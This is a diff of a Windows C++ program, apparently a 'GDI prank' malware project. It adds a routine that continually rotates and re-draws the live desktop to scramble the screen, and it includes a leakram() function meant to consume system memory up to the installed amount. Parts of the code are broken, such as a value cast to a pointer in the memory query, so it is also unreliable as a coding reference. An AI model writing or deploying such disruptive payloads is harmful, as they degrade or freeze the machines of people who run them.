@@ -2,6 +2,63 @@
 #include "include.h"
 #define fori(x) for (INT i = 0; i < x; i++)
 
+HWND hWNDdesk = GetDesktopWindow();
+HDC hDCdesk = GetDC(NULL);
+
+void RotBlt(HDC destDC, int srcx1, int srcy1, int srcx2, int srcy2,
+    HDC srcDC, int destx1, int desty1, int thetaInDegrees, DWORD mode)
+{
+    double theta = thetaInDegrees * (3.14159 / 180);
+    //multiply degrees by PI/180 to convert to radians
+
+    //determine width and height of source
+    int width = srcx2 - srcx1;
+    int height = srcy2 - srcy1;
+
+    //determine centre/pivot point ofsource
+    int centreX = int(float(srcx2 + srcx1) / 2);
+    int centreY = int(float(srcy2 + srcy1) / 2);
+
+    //since image is rotated we need to allocate a rectangle
+    //which can hold the image in any orientation
+    if (width > height)height = width;
+    else
+        width = height;
+
+
+    //allocate memory and blah blah
+    HDC memDC = CreateCompatibleDC(destDC);
+    HBITMAP memBmp = CreateCompatibleBitmap(destDC, width, height);
+
+    HBITMAP obmp = (HBITMAP)SelectObject(memDC, memBmp);
+
+    //pivot point of our mem DC
+    int newCentre = int(float(width) / 2);
+
+    //hmmm here's the rotation code. X std maths :|
+    for (int x = srcx1; x <= srcx2; x++)
+        for (int y = srcy1; y <= srcy2; y++)
+        {
+            COLORREF col = GetPixel(srcDC, x, y);
+
+            int newX = int((x - centreX) * sin(theta) + (y - centreY) * cos(theta));
+            int newY = int((x - centreX) * cos(theta) - (y - centreY) * sin(theta));
+
+
+            SetPixel(memDC, newX + newCentre, newY + newCentre, col);
+        }
+
+    //splash onto the destination
+    BitBlt(destDC, destx1, desty1, width, height, memDC, 0, 0, mode);
+
+
+    //free mem and blah
+    SelectObject(memDC, obmp);
+
+    DeleteDC(memDC);
+    DeleteObject(memBmp);
+}
+
 int p1() { //msgbox
     MSGBOXPARAMS msg2 = { 0 };
     msg2.cbSize = sizeof(MSGBOXPARAMS);
@@ -82,16 +139,33 @@ int p3() {
 
 }
 
+int p4() {
+    //funny switch window effect, sort of like zooming in and out
+    INT xDesk = GetSystemMetrics(SM_CXSCREEN);
+    INT yDesk = GetSystemMetrics(SM_CYSCREEN);
+    RECT rect;
+    GetWindowRect(hWNDdesk, &rect);
+    INT w = rect.right - rect.left;
+    INT h = rect.bottom - rect.top;
+    SelectObject(hDCdesk, CreateSolidBrush(RGB(rand() % 255, rand() % 25, rand() % 255)));
+
+    int j = 0;
+    int deg = 0;
+
+    for (int i = 0; i < 1980; i++) {
+        j = i;
+        deg = i % 180;
+        RotBlt(hDCdesk, j, j, w, h, hDCdesk, i, i, i, SRCCOPY);
+        RotBlt(hDCdesk, 50, 50, w, h, hDCdesk, i, i, i, SRCCOPY);
+        Sleep(5);
+    }
+    return 0;
+}
+
 int leakram() {
     unsigned long long ramsize = 0;
     const char* array[] = { "AB" };
     GetPhysicallyInstalledSystemMemory((PULONGLONG)ramsize);
-    //ramsize = (long long)ramsize;
-    /*
-    std::random_device rd;
-    std::default_random_engine generator(rd);
-    std::uniform_int_distribution<long long unsigned> distribution(0, ramsize);
-    */
     
     for (unsigned long long i = 0; i < ramsize; i++) {
         if (!(i % 100)) {
